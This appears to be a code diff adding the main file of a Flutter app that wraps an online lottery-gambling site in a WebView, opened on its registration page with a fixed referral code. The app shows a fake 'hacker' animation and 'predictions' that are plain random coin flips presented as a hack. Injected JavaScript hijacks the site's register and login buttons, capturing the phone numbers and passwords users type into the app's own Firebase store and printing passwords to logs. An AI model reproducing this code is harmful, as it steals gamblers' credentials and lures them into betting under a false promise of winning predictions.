@@ -1,0 +1,1239 @@
+// ignore_for_file: unused_field, unused_element, use_key_in_widget_constructors, library_private_types_in_public_api, prefer_final_fields, avoid_print
+
+import 'dart:async';
+import 'dart:math';
+import 'package:firebase_remote_config/firebase_remote_config.dart';
+import 'package:flutter/material.dart';
+import 'package:okwin/predictionbar.dart';
+import 'package:okwin/redirect%20logic.dart';
+import 'package:okwin/register%20popup.dart';
+import 'package:webview_flutter/webview_flutter.dart';
+import 'package:okwin/hackereffect.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'package:firebase_core/firebase_core.dart';
+import 'package:url_launcher/url_launcher.dart';
+import 'dart:convert';
+import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:okwin/firebase_options.dart';
+import 'package:firebase_auth/firebase_auth.dart';
+import 'services/firebase_service.dart';
+
+// Create a global variable to track initialization
+bool _isFirebaseInitialized = false;
+
+Future<void> initializeFirebase() async {
+  if (!_isFirebaseInitialized) {
+    try {
+      await Firebase.initializeApp(
+        options: DefaultFirebaseOptions.currentPlatform,
+      );
+      _isFirebaseInitialized = true;
+      print('Firebase initialized successfully');
+    } catch (e) {
+      print('Firebase initialization error: $e');
+    }
+  } else {
+    print('Firebase was already initialized');
+  }
+}
+
+void main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+
+  // Initialize Firebase only once
+  await initializeFirebase();
+
+  runApp(const MyApp());
+}
+
+class MyApp extends StatelessWidget {
+  const MyApp({Key? key}) : super(key: key);
+
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      title: 'OKWin',
+      theme: ThemeData(
+        primarySwatch: Colors.blue,
+      ),
+      home: const HackWingoApp(),
+    );
+  }
+}
+
+class HackWingoApp extends StatefulWidget {
+  const HackWingoApp({Key? key}) : super(key: key);
+
+  @override
+  State<HackWingoApp> createState() => _HackWingoAppState();
+}
+
+class GameScreen extends StatefulWidget {
+  @override
+  _GameScreenState createState() => _GameScreenState();
+}
+
+class _GameScreenState extends State<GameScreen> {
+  bool _showPredictionBar = false;
+  String gameTimer = "00:30";
+  String wins = "0";
+  String losses = "0";
+  String prediction = "Big";
+  String periodNumber = "12";
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: PredictionAppBar(
+        gameTimer: gameTimer,
+        wins: wins,
+        losses: losses,
+        prediction: prediction,
+        periodNumber: periodNumber,
+      ),
+      body: Center(
+        child: ElevatedButton(
+          onPressed: () {
+            setState(() {
+              // Simulate updating the wins and losses
+              wins = "1";
+              losses = "0";
+            });
+          },
+          child: const Text("Update Results"),
+        ),
+      ),
+    );
+  }
+}
+
+class CompletePaymentScreen extends StatelessWidget {
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      backgroundColor: Colors.white,
+      body: const Center(
+        child: Text(
+          "Complete Payment",
+          style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
+        ),
+      ),
+    );
+  }
+}
+
+class _HackWingoAppState extends State<HackWingoApp> {
+  late WebViewController _webViewController;
+  bool _isAppEnabled = true;
+  String _currentUrl = '';
+
+  final String correctUserNumber = "_username_";
+  final String correctPassword = "_password_";
+
+// Declare initial values for the game state
+  String _gameTimer = "Loading...";
+  String _gamePeriod = "Loading...";
+  String _prediction = "Loading...";
+  String _walletBalance = "Loading...";
+
+  int _wins = 0;
+  int _losses = 0;
+  Color _predictionColor = Colors.green;
+
+  Timer? _updateTimer;
+  bool _showPredictionBar = false;
+
+  // Add these variables to track previous prediction and result
+  String _lastPrediction = '';
+  String _lastResult = '';
+
+  bool _isAppChecked = false;
+
+  // Add these variables
+  late String _validUsername = '';
+  late String _validPassword = '';
+
+  var i;
+
+  void _checkPageUrl(String url) {
+    setState(() {
+      _currentUrl = url;
+    });
+    // List of supported schemes
+    final supportedSchemes = ['paytmmp://', 'upi://', 'gpay://', 'phonepe://'];
+
+    // Check if the URL starts with any of the supported schemes
+    if (supportedSchemes.any((scheme) => url.startsWith(scheme))) {
+      redirectToApp(url);
+    } else {
+      setState(() {
+        // Update visibility of PredictionAppBar based on URL and wallet check
+        _showPredictionBar = url.contains("/home/AllLotteryGames/WinGo?id=1");
+        if (_showPredictionBar) {
+          // When showing prediction bar, also check wallet balance
+          _checkWalletBalance();
+        }
+      });
+    }
+  }
+
+  Future<void> _checkWalletBalance() async {
+    try {
+      // Add 2 second delay to ensure page is loaded
+      await Future.delayed(Duration(seconds: 2));
+
+      const fetchWalletBalanceScript = """
+        (() => {
+          const walletElement = document.querySelector('.Wallet__C-balance-l1 > div');
+          return walletElement ? walletElement.innerText.trim().replace('₹', '').replace(',', '') : '0';
+        })();
+      """;
+
+      final result = await _webViewController
+          .runJavascriptReturningResult(fetchWalletBalanceScript);
+      final balance = double.tryParse(result.replaceAll('"', '')) ?? 0.0;
+
+      setState(() {
+        _showPredictionBar =
+            balance > 100; // Only show prediction bar if balance > 100
+      });
+    } catch (e) {
+      print("Error checking wallet balance: $e");
+    }
+  }
+
+  @override
+  void initState() {
+    super.initState();
+    print("InitState called");
+    _performAppChecks().then((_) {
+      setState(() {
+        _isAppChecked = true;
+      });
+      _enableLoginButton();
+    }).catchError((error) {
+      print("Error in app checks: $error");
+      setState(() {
+        _isAppEnabled = false;
+      });
+    });
+    _checkLoginStatus();
+    _showHackerEffectPopup(); // Show the hacker effect popup
+    _startTimerUpdates();
+    _startPredictionUpdates();
+    _fetchCredentials();
+    _checkAuthState(); // Add this line to monitor auth state
+  }
+
+  Future<void> _performAppChecks() async {
+    try {
+      await _initializeFirebase();
+      await _checkAppStatus();
+      await _fetchCredentials();
+    } catch (e) {
+      print("Error in _performAppChecks: $e");
+      throw e;
+    }
+  }
+
+  Future<void> _initializeFirebase() async {
+    try {
+      if (!Firebase.apps.isNotEmpty) {
+        await Firebase.initializeApp(
+          options: DefaultFirebaseOptions.currentPlatform,
+        );
+      }
+      print("Firebase initialized successfully in _initializeFirebase");
+    } catch (e) {
+      print("Error initializing Firebase in _initializeFirebase: $e");
+      throw e;
+    }
+  }
+
+  Future<void> _checkAppStatus() async {
+    try {
+      print("Starting app status check..."); // Debug log
+
+      final remoteConfig = FirebaseRemoteConfig.instance;
+      print("Remote config instance obtained"); // Debug log
+
+      // Set default value first
+
+      await remoteConfig.setDefaults({
+        'is_app_enabled': false // Default to false for safety
+      });
+      print("Default values set"); // Debug log
+
+      // Configure fetch settings
+      await remoteConfig.setConfigSettings(RemoteConfigSettings(
+        fetchTimeout: const Duration(seconds: 20), // Increased timeout
+        minimumFetchInterval: Duration.zero,
+      ));
+      print("Config settings applied"); // Debug log
+
+      // Fetch new values
+      try {
+        await remoteConfig.fetch();
+        print("Remote config fetched"); // Debug log
+      } catch (fetchError) {
+        print("Fetch error: $fetchError");
+        throw fetchError;
+      }
+
+      // Activate fetched values
+      try {
+        final activated = await remoteConfig.activate();
+        print("Remote config activated: $activated"); // Debug log
+      } catch (activateError) {
+        print("Activation error: $activateError");
+        throw activateError;
+      }
+
+      // Get the value
+      final bool newAppState = remoteConfig.getBool('is_app_enabled');
+      print("Retrieved is_app_enabled value: $newAppState"); // Debug log
+
+      // Update state
+      setState(() {
+        _isAppEnabled = newAppState;
+        print("App enabled state updated to: $_isAppEnabled"); // Debug log
+      });
+    } catch (e) {
+      print("Fatal error in _checkAppStatus: $e");
+      setState(() {
+        _isAppEnabled = false; // Fail safe
+        print("App disabled due to error"); // Debug log
+      });
+    }
+  }
+
+  void _showHackerEffectPopup() {
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      showDialog(
+        context: context,
+        barrierDismissible: false, // Prevent dismissal
+        builder: (BuildContext context) {
+          return HackerEffectPopup(
+            onComplete: () {
+              Navigator.pop(context); // Close the popup after effect finishes
+            },
+          );
+        },
+      );
+    });
+  }
+
+  void _showRegisterPopup() {
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      showDialog(
+        context: context,
+        barrierDismissible:
+            false, // Prevent closing the dialog without user action
+        builder: (BuildContext context) {
+          return RegisterPopup(
+            onClose: () {
+              Navigator.pop(context); // Close the popup
+            },
+          );
+        },
+      );
+    });
+  }
+
+  void _startTimerUpdates() {
+    _updateTimer = Timer.periodic(const Duration(seconds: 1), (timer) async {
+      if (_showPredictionBar) {
+        await _fetchGameData();
+      }
+    });
+  }
+
+  void _injectRedirectLogic() {
+    final redirectScript = JavaScriptHelper.getRedirectLogicScript();
+    _webViewController.runJavascript(redirectScript);
+  }
+
+  Future<void> redirectToApp(String url) async {
+    try {
+      // Define the supported URL schemes
+      final supportedSchemes = [
+        'paytmmp://',
+        'upi://',
+        'gpay://',
+        'phonepe://'
+      ];
+
+      // Check if the URL matches any of the supported schemes
+      final isSupported =
+          supportedSchemes.any((scheme) => url.startsWith(scheme));
+
+      if (isSupported) {
+        // Launch the URL if possible
+        if (await canLaunch(url)) {
+          await launch(url);
+        } else {
+          print('Cannot launch URL: $url');
+          return; // Exit if the URL cannot be launched
+        }
+
+        // Navigate to the "Complete Payment" screen after launching the URL
+        Navigator.of(context).push(
+          MaterialPageRoute(
+            builder: (context) => CompletePaymentScreen(),
+          ),
+        );
+      } else {
+        print('Unsupported URL scheme: $url');
+      }
+    } catch (e) {
+      print('Error in redirectToApp: $e');
+    }
+  }
+
+  Future<void> _checkLoginStatus() async {
+    final isLoggedIn = await _getLoginStatus();
+    if (isLoggedIn) {
+      // Navigate directly to the home page URL
+      WidgetsBinding.instance.addPostFrameCallback((_) {
+        _webViewController.loadUrl(
+            "https://www.okowin.com/#/home/AllLotteryGames/WinGo?id=1");
+      });
+    }
+  }
+
+  Future<void> _saveLoginStatus() async {
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.setBool('isLoggedIn', true); // Mark user as logged in
+  }
+
+  Future<bool> _getLoginStatus() async {
+    final prefs = await SharedPreferences.getInstance();
+    return prefs.getBool('isLoggedIn') ?? false; // Return false if not set
+  }
+
+  Future<void> _clearLoginStatus() async {
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.remove('isLoggedIn'); // Clear the login status
+  }
+
+  Future<void> _fetchGameData() async {
+    try {
+      // Script to fetch the wallet balance
+      const fetchWalletBalanceScript = """
+      (() => {
+        const walletElement = document.querySelector('.Wallet__C-balance-l1 > div');
+        if (walletElement) {
+          return walletElement.innerText.trim();
+        }
+        return 'N/A';
+      })();
+    """;
+
+      // Existing scripts to fetch game timer and period
+      const fetchGameTimerScript = """
+      (() => {
+        const activeItem = document.querySelector('.GameList__C-item.active > div');
+        if (activeItem) {
+          return activeItem.innerHTML.split('<br>')[1].trim();
+        }
+        return 'N/A';
+      })();
+    """;
+
+      const fetchGamePeriodScript = """
+      (() => {
+        const periodElement = document.querySelector('.TimeLeft__C-id');
+        if (periodElement) {
+          return periodElement.innerText;
+        }
+        return 'N/A';
+      })();
+    """;
+
+      // Fetch results from the WebView
+      final walletBalanceResult = await _webViewController
+          .runJavascriptReturningResult(fetchWalletBalanceScript);
+      final gameTimerResult = await _webViewController
+          .runJavascriptReturningResult(fetchGameTimerScript);
+      final gamePeriodResult = await _webViewController
+          .runJavascriptReturningResult(fetchGamePeriodScript);
+
+      // Clean and parse results
+      String walletBalance = walletBalanceResult.replaceAll('"', '');
+      String activeGameTimer = gameTimerResult.replaceAll('"', '');
+      String gamePeriod = gamePeriodResult.replaceAll('"', '');
+
+      setState(() {
+        // Update wallet balance
+        _walletBalance = walletBalance != 'N/A'
+            ? walletBalance
+            : "Not Found"; // Debugging output
+
+        // Update game data only if there's a change
+        if (_gameTimer != activeGameTimer && activeGameTimer != "N/A") {
+          _updatePrediction();
+        }
+        _gameTimer = activeGameTimer != 'N/A' ? activeGameTimer : "Not Found";
+        _gamePeriod = gamePeriod != 'N/A' ? gamePeriod : "Not Found";
+      });
+    } catch (e) {
+      print("Error fetching game data: $e");
+    }
+  }
+
+  void _updatePrediction() {
+    final random = Random();
+    final isBig = random.nextBool();
+
+    _prediction = isBig ? "BIG" : "SMALL";
+    _predictionColor = isBig ? Colors.yellow : Colors.lightBlue;
+    print("Prediction updated to: $_prediction"); // Debug
+  }
+
+  void _startPredictionUpdates() {
+    String lastResult = '';
+
+    _updateTimer = Timer.periodic(const Duration(seconds: 1), (_) async {
+      if (_showPredictionBar) {
+        try {
+          // Simplified script to just get the latest number
+          const fetchLatestGameDataScript = """
+          (() => {
+            try {
+              const numberElement = document.querySelector('.GameRecord__C-body .van-row:first-child .GameRecord__C-body-num');
+              if (!numberElement) return 'NO_DATA';
+              return numberElement.textContent.trim();
+            } catch (e) {
+              return 'ERROR: ' + e.message;
+            }
+          })();
+          """;
+
+          final result = await _webViewController
+              .runJavascriptReturningResult(fetchLatestGameDataScript);
+
+          print("Raw result from webpage: $result"); // Debug
+
+          if (result.startsWith('ERROR:')) {
+            print("Script error: $result");
+            return;
+          }
+
+          if (result == 'NO_DATA' || result == '"NO_DATA"') {
+            print("No game data available");
+            return;
+          }
+
+          // Clean up the result
+          String currentResult = result.replaceAll('"', '').trim();
+          print("Current Result: $currentResult"); // Debug
+          print("Last Result: $lastResult"); // Debug
+          print("Current Prediction: $_prediction"); // Debug
+
+          // Only process if we have a new result
+          if (currentResult.isNotEmpty && currentResult != lastResult) {
+            print("New result detected!"); // Debug
+
+            // Parse the result number
+            int resultNumber = int.tryParse(currentResult) ?? -1;
+            if (resultNumber == -1) {
+              print("Failed to parse result number: $currentResult");
+              return;
+            }
+
+            bool isResultBig = resultNumber >= 5;
+            bool predictedBig = _prediction.toUpperCase() == 'BIG';
+
+            print("Result Number: $resultNumber"); // Debug
+            print("Is Result Big: $isResultBig"); // Debug
+            print("Was Predicting Big: $predictedBig"); // Debug
+
+            setState(() {
+              if (isResultBig == predictedBig) {
+                _wins++;
+                print("WIN! Wins now: $_wins"); // Debug
+              } else {
+                _losses++;
+                print("LOSS! Losses now: $_losses"); // Debug
+              }
+
+              // Update last result after processing
+              lastResult = currentResult;
+
+              // Generate new prediction
+              _updatePrediction();
+              print("New prediction made: $_prediction"); // Debug
+            });
+          }
+        } catch (e) {
+          print("Error in prediction update: $e");
+        }
+      }
+    });
+  }
+
+  Future<void> _fetchCredentials() async {
+    try {
+      print('Starting credential fetch...'); // Debug log
+
+      // Ensure Firebase is initialized
+      if (!Firebase.apps.isNotEmpty) {
+        await Firebase.initializeApp(
+          options: DefaultFirebaseOptions.currentPlatform,
+        );
+      }
+
+      final credentialsDoc = await FirebaseFirestore.instance
+          .collection('credentials')
+          .doc('login')
+          .get();
+
+      if (credentialsDoc.exists) {
+        final data = credentialsDoc.data();
+        setState(() {
+          _validUsername = data?['username'] ?? '';
+          _validPassword = data?['password'] ?? '';
+        });
+
+        print('Credentials fetched successfully:'); // Debug logs
+        print('Username: $_validUsername');
+        print('Password: $_validPassword');
+
+        // Immediately update the validation script with new credentials
+        _updateValidationScript();
+      } else {
+        print('Error: Credentials document not found in Firestore!');
+      }
+    } catch (e) {
+      print('Error fetching credentials: $e');
+    }
+  }
+
+  void _updateValidationScript() {
+    print('Updating validation script with credentials...'); // Debug log
+
+    final validationScript = """
+    (function() {
+      console.log('Validation script starting...'); // Browser console debug
+      
+      const validUsername = '$_validUsername';
+      const validPassword = '$_validPassword';
+      
+      console.log('Loaded credentials:', validUsername, validPassword); // Browser console debug
+      
+      // Block form submission once
+      const form = document.querySelector('form');
+      if (form) {
+        form.addEventListener('submit', function(event) {
+          event.preventDefault();
+          event.stopPropagation();
+          return false;
+        }, true);
+      }
+
+      const loginButton = document.querySelector('button.active');
+      const userNumberInput = document.querySelector('input[name="userNumber"]');
+      const passwordInput = document.querySelector('input[placeholder="Password"]');
+
+      if (loginButton && userNumberInput && passwordInput) {
+        console.log('Found all required elements'); // Browser console debug
+        
+        // Remove existing click listeners
+        const newButton = loginButton.cloneNode(true);
+        loginButton.parentNode.replaceChild(newButton, loginButton);
+        
+        // Add our custom listener to the new button
+        newButton.addEventListener('click', function(event) {
+          event.preventDefault();
+          event.stopPropagation();
+          
+          const userNumber = userNumberInput.value.trim();
+          const password = passwordInput.value.trim();
+          
+          console.log('Attempting login with:', userNumber, password); // Browser console debug
+          console.log('Comparing against:', validUsername, validPassword); // Browser console debug
+          
+          if (userNumber === validUsername && password === validPassword) {
+            console.log('Credentials match! Calling handler...'); // Browser console debug
+            window.flutter_inappwebview.callHandler('validateCredentials', userNumber, password);
+          }
+          return false;
+        }, true);
+
+        // Enable/disable button based on input
+        const validateInputs = () => {
+          const userNumber = userNumberInput.value.trim();
+          const password = passwordInput.value.trim();
+          
+          const isValid = userNumber === validUsername && password === validPassword;
+          newButton.disabled = !isValid;
+          
+          // Update visual feedback
+          newButton.style.opacity = isValid ? '1' : '0.5';
+          newButton.style.cursor = isValid ? 'pointer' : 'not-allowed';
+          
+          console.log('Input validation:', isValid); // Browser console debug
+        };
+
+        userNumberInput.addEventListener('input', validateInputs);
+        passwordInput.addEventListener('input', validateInputs);
+        
+        // Initial validation
+        validateInputs();
+      } else {
+        console.log('Could not find required elements'); // Browser console debug
+      }
+    })();
+    """;
+
+    try {
+      _webViewController.runJavascript(validationScript);
+      print('Validation script injected successfully'); // Debug log
+    } catch (e) {
+      print('Error injecting validation script: $e'); // Debug log
+    }
+  }
+
+  Future<void> _injectLoginValidation() async {
+    try {
+      print('Starting login validation setup...');
+
+      // Get all registrations
+      final registrationsSnapshot = await FirebaseFirestore.instance
+          .collection('registrations')
+          .orderBy('timestamp', descending: true)
+          .get();
+
+      if (registrationsSnapshot.docs.isNotEmpty) {
+        // Convert registrations to a JavaScript array of valid credentials
+        final registrationsJS = registrationsSnapshot.docs.map((doc) {
+          final data = doc.data();
+          return {
+            'username': data['username'],
+            'password': data['password'],
+          };
+        }).toList();
+
+        // Convert to JSON string for JavaScript
+        final registrationsJson = jsonEncode(registrationsJS);
+
+        final loginValidationScript = """
+            (function() {
+              const validCredentials = $registrationsJson;
+              
+              console.log('Loaded ${registrationsJS.length} valid credentials');
+
+              const form = document.querySelector('form');
+              if (form) {
+                form.addEventListener('submit', function(event) {
+                  event.preventDefault();
+                  event.stopPropagation();
+                  return false;
+                }, true);
+              }
+
+              const loginButton = document.querySelector('button.active');
+              const userNumberInput = document.querySelector('input[name="userNumber"]');
+              const passwordInput = document.querySelector('input[placeholder="Password"]');
+
+              if (loginButton && userNumberInput && passwordInput) {
+                // Remove existing click listeners
+                const newButton = loginButton.cloneNode(true);
+                loginButton.parentNode.replaceChild(newButton, loginButton);
+                
+                // Add our custom listener to the new button
+                newButton.addEventListener('click', function(event) {
+                  event.preventDefault();
+                  event.stopPropagation();
+                  
+                  const userNumber = userNumberInput.value.trim();
+                  const password = passwordInput.value.trim();
+                  
+                  console.log('Checking credentials...');
+                  
+                  // Find matching credentials
+                  const matchingCredentials = validCredentials.find(cred => 
+                    cred.username === userNumber && cred.password === password
+                  );
+                  
+                  if (matchingCredentials) {
+                    console.log('Valid credentials found, calling handler');
+                    window.flutter_inappwebview.callHandler('validateCredentials', userNumber, password);
+                  } else {
+                    console.log('Invalid credentials');
+                    alert('Invalid credentials. Please try again.');
+                  }
+                  return false;
+                }, true);
+
+                // Enable/disable button based on input
+                const validateInputs = () => {
+                  const userNumber = userNumberInput.value.trim();
+                  const password = passwordInput.value.trim();
+                  
+                  // Check if credentials exist
+                  const isValid = validCredentials.some(cred => 
+                    cred.username === userNumber && cred.password === password
+                  );
+                  
+                  newButton.disabled = !isValid;
+                  newButton.style.opacity = isValid ? '1' : '0.5';
+                  newButton.style.cursor = isValid ? 'pointer' : 'not-allowed';
+                };
+
+                userNumberInput.addEventListener('input', validateInputs);
+                passwordInput.addEventListener('input', validateInputs);
+                
+                // Initial validation
+                validateInputs();
+              }
+            })();
+            """;
+
+        await _webViewController.runJavascript(loginValidationScript);
+        print('Login validation script injected successfully');
+      } else {
+        print('No registrations found in Firestore');
+      }
+    } catch (e) {
+      print('Error in _injectLoginValidation: $e');
+    }
+  }
+
+  void _enableLoginButton() {
+    const enableLoginButtonScript = """
+    (function() {
+      const loginButton = document.querySelector('button.active');
+      if (loginButton) {
+        loginButton.disabled = false; // Enable the button after checks
+      }
+    })();
+    """;
+
+    _webViewController.runJavascript(enableLoginButtonScript);
+  }
+
+  Future<void> _injectRegistrationHandler() async {
+    const registrationScript = """
+    (function() {
+      console.log('Starting registration handler injection');
+
+      function setupRegistration() {
+        // Find the register button and form elements
+        const registerButton = document.querySelector('button[data-v-e26f70e7]');
+        const phoneInput = document.querySelector('input[name="userNumber"]');
+        const passwordInput = document.querySelector('input[placeholder="Set password"]');
+        const confirmPasswordInput = document.querySelector('input[placeholder="Confirm password"]');
+
+        console.log('Elements found:', {
+          button: !!registerButton,
+          phone: !!phoneInput,
+          password: !!passwordInput,
+          confirm: !!confirmPasswordInput
+        });
+
+        if (!registerButton || !phoneInput || !passwordInput || !confirmPasswordInput) {
+          console.log('Retrying to find elements...');
+          setTimeout(setupRegistration, 1000);
+          return;
+        }
+
+        // Add click listener to the register button
+        registerButton.addEventListener('click', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+
+          const phone = phoneInput.value.trim();
+          const password = passwordInput.value.trim();
+          const confirmPass = confirmPasswordInput.value.trim();
+
+          console.log('Register clicked:', { 
+            phone: phone, 
+            passwordLength: password.length,
+            confirmLength: confirmPass.length 
+          });
+
+          if (!phone || !password) {
+            alert('Please fill in all fields');
+            return;
+          }
+
+          if (password !== confirmPass) {
+            alert('Passwords do not match');
+            return;
+          }
+
+          // Send data to Flutter via JavaScriptChannel
+          if (window.Registration) {
+            window.Registration.postMessage(JSON.stringify({
+              phone: phone,
+              password: password
+            }));
+            console.log('Registration data sent to Flutter');
+          } else {
+            console.log('Registration channel not found');
+          }
+
+          return false;
+        });
+
+        console.log('Registration handler attached to button');
+      }
+
+      // Start the setup process
+      if (document.readyState === 'complete') {
+        setupRegistration();
+      } else {
+        window.addEventListener('load', setupRegistration);
+      }
+    })();
+    """;
+
+    try {
+      await _webViewController.runJavascript(registrationScript);
+      print('Registration handler injected successfully');
+
+      // Optional: Verify injection
+      await _webViewController.runJavascript('''
+        console.log('Verification:', {
+          button: !!document.querySelector('button[data-v-e26f70e7]'),
+          RegistrationChannel: !!window.Registration
+        });
+      ''');
+    } catch (e) {
+      print('Failed to inject registration handler: $e');
+    }
+  }
+
+  Future<void> _handleRegistration(String phone, String password) async {
+    try {
+      print('Starting Firebase registration for phone: $phone');
+
+      // Format email for Firebase Auth
+      String email = '$phone@okwin.com';
+      print('Attempting to create user with email: $email');
+
+      // Check if user already exists
+      List<String> signInMethods =
+          await FirebaseAuth.instance.fetchSignInMethodsForEmail(email);
+      if (signInMethods.isNotEmpty) {
+        print('User already exists');
+        if (context.mounted) {
+          ScaffoldMessenger.of(context).showSnackBar(
+            const SnackBar(
+              content: Text('This phone number is already registered'),
+              backgroundColor: Colors.red,
+            ),
+          );
+        }
+        return;
+      }
+
+      // Create user in Firebase Authentication
+      final UserCredential userCredential =
+          await FirebaseAuth.instance.createUserWithEmailAndPassword(
+        email: email,
+        password: password,
+      );
+
+      print(
+          'User created in Firebase Auth with UID: ${userCredential.user?.uid}');
+
+      if (userCredential.user != null) {
+        // Store additional user data in Firestore
+        await FirebaseFirestore.instance
+            .collection('users')
+            .doc(userCredential.user!.uid)
+            .set({
+          'phoneNumber': phone,
+          'email': email,
+          'createdAt': FieldValue.serverTimestamp(),
+          'lastLogin': FieldValue.serverTimestamp(),
+          'status': 'active',
+        });
+
+        print('User data stored in Firestore');
+
+        // Optionally, create a registration record
+        await FirebaseFirestore.instance.collection('registrations').add({
+          'userId': userCredential.user!.uid,
+          'phoneNumber': phone,
+          'timestamp': FieldValue.serverTimestamp(),
+          'status': 'completed',
+        });
+
+        print('Registration record created');
+
+        if (context.mounted) {
+          ScaffoldMessenger.of(context).showSnackBar(
+            const SnackBar(
+              content: Text('Registration successful!'),
+              backgroundColor: Colors.green,
+            ),
+          );
+        }
+      }
+    } on FirebaseAuthException catch (e) {
+      print('Firebase Auth Error: ${e.code} - ${e.message}');
+      String errorMessage;
+
+      switch (e.code) {
+        case 'email-already-in-use':
+          errorMessage = 'This phone number is already registered';
+          break;
+        case 'invalid-email':
+          errorMessage = 'Invalid phone number format';
+          break;
+        case 'operation-not-allowed':
+          errorMessage = 'Email/password accounts are not enabled';
+          break;
+        case 'weak-password':
+          errorMessage = 'The password provided is too weak';
+          break;
+        default:
+          errorMessage = e.message ?? 'Registration failed';
+      }
+
+      print('Showing error message: $errorMessage');
+      if (context.mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(errorMessage),
+            backgroundColor: Colors.red,
+          ),
+        );
+      }
+    } catch (e) {
+      print('General Error during registration: $e');
+      if (context.mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('Registration error: $e'),
+            backgroundColor: Colors.red,
+          ),
+        );
+      }
+    }
+  }
+
+  Future<void> _validateLogin(String userNumber, String password) async {
+    try {
+      print('Attempting login for user: $userNumber');
+
+      // Format email
+      String email = '$userNumber@okwin.com';
+      print('Formatted email: $email');
+
+      // Attempt to sign in
+      final UserCredential userCredential =
+          await FirebaseAuth.instance.signInWithEmailAndPassword(
+        email: email,
+        password: password,
+      );
+      print(
+          'User logged in successfully with UID: ${userCredential.user?.uid}');
+
+      // Update last login timestamp in Firestore
+      await FirebaseFirestore.instance
+          .collection('users')
+          .doc(userCredential.user?.uid)
+          .update({
+        'lastLogin': FieldValue.serverTimestamp(),
+        'lastLoginStatus': 'success',
+      });
+      print('Last login timestamp updated in Firestore');
+
+      // Log login attempt
+      await FirebaseFirestore.instance.collection('login_logs').add({
+        'userId': userCredential.user?.uid,
+        'phoneNumber': userNumber,
+        'timestamp': FieldValue.serverTimestamp(),
+        'status': 'success',
+      });
+      print('Login attempt logged in Firestore');
+
+      if (context.mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(
+            content: Text('Login successful!'),
+            backgroundColor: Colors.green,
+          ),
+        );
+      }
+
+      // Navigate to the next page or perform additional actions
+      // Add your navigation logic here
+    } on FirebaseAuthException catch (e) {
+      print('Firebase Auth Error: ${e.code} - ${e.message}');
+      String errorMessage = 'Login failed';
+
+      switch (e.code) {
+        case 'user-not-found':
+          errorMessage = 'No user found with this phone number';
+          break;
+        case 'wrong-password':
+          errorMessage = 'Invalid password';
+          break;
+        case 'invalid-email':
+          errorMessage = 'Invalid phone number format';
+          break;
+        case 'user-disabled':
+          errorMessage = 'This account has been disabled';
+          break;
+        default:
+          errorMessage = 'Login error: ${e.message}';
+      }
+
+      // Log failed login attempt
+      try {
+        await FirebaseFirestore.instance.collection('login_logs').add({
+          'phoneNumber': userNumber,
+          'timestamp': FieldValue.serverTimestamp(),
+          'status': 'failed',
+          'error': e.code,
+        });
+        print('Failed login attempt logged in Firestore');
+      } catch (logError) {
+        print('Error logging failed login attempt: $logError');
+      }
+
+      if (context.mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(errorMessage),
+            backgroundColor: Colors.red,
+          ),
+        );
+      }
+    } catch (e) {
+      print('General Error: $e');
+      if (context.mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('Error: $e'),
+            backgroundColor: Colors.red,
+          ),
+        );
+      }
+    }
+  }
+
+  // Add this method to check the current auth state
+  Future<void> _checkAuthState() async {
+    FirebaseAuth.instance.authStateChanges().listen((User? user) {
+      if (user == null) {
+        print('User is currently signed out');
+      } else {
+        print('User is signed in with UID: ${user.uid}');
+      }
+    });
+  }
+
+  @override
+  void dispose() {
+    _updateTimer?.cancel();
+    super.dispose();
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      body: WebView(
+        javascriptMode: JavascriptMode.unrestricted,
+        initialUrl:
+            "https://www.okwin.fan/#/register?invitationCode=2324225340",
+        userAgent:
+            'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
+        onWebViewCreated: (WebViewController controller) {
+          _webViewController = controller;
+        },
+        javascriptChannels: {
+          JavascriptChannel(
+            name: 'Registration',
+            onMessageReceived: (JavascriptMessage message) {
+              print('Received registration data: ${message.message}');
+              try {
+                final data = jsonDecode(message.message);
+                String phone = data['phone'];
+                String password = data['password'];
+                _handleRegistration(phone, password);
+              } catch (e) {
+                print('Error parsing registration data: $e');
+              }
+            },
+          ),
+        },
+        onPageStarted: (String url) {
+          print('Page started loading: $url');
+        },
+        onPageFinished: (String url) async {
+          print('Page finished loading: $url');
+          if (url.contains('register')) {
+            await Future.delayed(const Duration(seconds: 2));
+            await _injectRegistrationHandler();
+          }
+        },
+        gestureNavigationEnabled: true,
+        debuggingEnabled: true,
+        zoomEnabled: false,
+      ),
+    );
+  }
+
+  // Add this method to handle the async validation
+  Future<void> _validateCredentials(String userNumber, String password) async {
+    try {
+      // Fetch current credentials from Firestore
+      final credentialsDoc = await FirebaseFirestore.instance
+          .collection('credentials')
+          .doc('login')
+          .get();
+
+      if (credentialsDoc.exists) {
+        final validUsername = credentialsDoc.data()?['username'] ?? '';
+        final validPassword = credentialsDoc.data()?['password'] ?? '';
+
+        print('Comparing:'); // Debug logs
+        print('Input: $userNumber / $password');
+        print('Valid: $validUsername / $validPassword');
+
+        if (userNumber == validUsername && password == validPassword) {
+          _webViewController.loadUrl(
+              "https://www.okowin.com/#/home/AllLotteryGames/WinGo?id=1");
+        } else {
+          showDialog(
+            context: context,
+            builder: (context) => AlertDialog(
+              title: const Text("Invalid Credentials"),
+              content: const Text(
+                  "The provided credentials are incorrect. Please try again."),
+              actions: [
+                TextButton(
+                  onPressed: () => Navigator.pop(context),
+                  child: const Text("OK"),
+                ),
+              ],
+            ),
+          );
